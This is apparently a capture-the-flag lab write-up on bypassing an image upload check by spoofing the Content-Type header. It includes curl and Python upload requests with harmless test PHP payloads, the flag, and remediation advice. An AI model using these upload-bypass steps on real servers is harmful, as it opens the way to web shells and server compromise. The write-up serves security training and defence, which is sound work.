# File Upload Bypass - MIME Type Spoofing

## Breach Type
**Unrestricted File Upload / Input Validation Failure** — OWASP Top 10: A04:2021 Insecure Design

## What is this Vulnerability?
**Unrestricted File Upload** is a vulnerability where a web application allows users to upload files without properly validating the file type, content, or extension. This can let an attacker upload a **malicious file** (like a PHP web shell) that gets executed on the server.

In this case, the server checks the `Content-Type` HTTP header to determine if the uploaded file is an image. But the `Content-Type` header is sent by the **client's browser** — the attacker controls it completely. By setting `Content-Type: image/jpeg` while uploading a `.php` file, the server thinks it's receiving an image and accepts it.

This is like a security guard checking your ID badge color (which you can change) instead of your actual identity.

### Why is it dangerous?
- **Remote Code Execution (RCE)**: Uploading a PHP/JSP/ASP web shell gives the attacker a command line on the server
- **Full server compromise**: From a web shell, attackers can read all files, access databases, install backdoors
- **Malware hosting**: The server can be used to distribute malware to other users
- **Defacement**: Attackers can replace the website's pages with their own content
- **Lateral movement**: Compromised servers can be used as a pivot to attack internal network

### Real-world impact
Unrestricted file upload has caused major breaches. The 2017 Equifax breach (147M records) partially relied on unrestricted upload. Many ransomware attacks start with uploading a web shell through a vulnerable file upload form.

## Where
URL: `http://<IP>/?page=upload`
The image upload page.

## How I Found It
1. Navigated to the **Upload** page (`?page=upload`).
2. The form expects an image file upload (`type="file"`).
3. Tried uploading a PHP file → rejected (only images allowed).
4. The server checks the `Content-Type` header, not the actual file content.
5. By changing the `Content-Type` to `image/jpeg` while uploading a malicious file (e.g., PHP script), the server accepts it.

## Step-by-Step Exploitation

### Step 1: Inspect the Upload Form
```html
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose an image to upload:
    <input name="uploaded" type="file">
    <input type="submit" name="Upload" value="Upload">
</form>
```

### Step 2: Craft Malicious Upload with Spoofed Content-Type
```bash
curl -X POST "http://<IP>/?page=upload" \
  -F "uploaded=@/tmp/malicious.php;type=image/jpeg" \
  -F "Upload=Upload"
```

Or create a minimal test file and upload:
```bash
echo '<?php echo "hacked"; ?>' > /tmp/test.php
curl -X POST "http://<IP>/?page=upload" \
  -F "uploaded=@/tmp/test.php;type=image/jpeg" \
  -F "Upload=Upload"
```

### Step 3: Get the Flag
The server responds with:
```
The flag is 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Flag
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## How to Test Manually

### Method 1: Using curl
```bash
# Create a test file
echo "test" > /tmp/test.txt

# Upload with spoofed MIME type
curl -X POST "http://<IP>/?page=upload" \
  -F "uploaded=@/tmp/test.txt;type=image/jpeg" \
  -F "Upload=Upload"
```

### Method 2: Using Browser + Burp Suite / Dev Tools
1. Open `http://<IP>/?page=upload`
2. Select any non-image file
3. Before submitting, intercept the request with **Burp Suite** or browser DevTools
4. Change the `Content-Type` of the uploaded file from its real type to `image/jpeg`
5. Send the modified request
6. The flag appears

### Method 3: Using Python
```python
import requests

url = "http://<IP>/?page=upload"
files = {'uploaded': ('malicious.php', b'<?php echo "test"; ?>', 'image/jpeg')}
data = {'Upload': 'Upload'}
r = requests.post(url, files=files, data=data)
print(r.text)
```

## How to Fix
- **Never rely on Content-Type header** — it's set by the client and trivially spoofed
- **Validate file content** using magic bytes (file signatures):
  ```php
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $mime = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);
  $allowed = ['image/jpeg', 'image/png', 'image/gif'];
  if (!in_array($mime, $allowed)) { die("Invalid file type"); }
  ```
- **Check file extension** against a whitelist
- **Rename uploaded files** to prevent execution (random name + safe extension)
- **Store uploads outside the web root** or in a non-executable directory
- **Set proper permissions** on upload directory (no execute)
- **Use image processing** (e.g., GD/ImageMagick) to re-encode the file — this strips embedded code
- **Limit file size** server-side (not just via `MAX_FILE_SIZE` hidden field)

## OWASP Reference
- [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
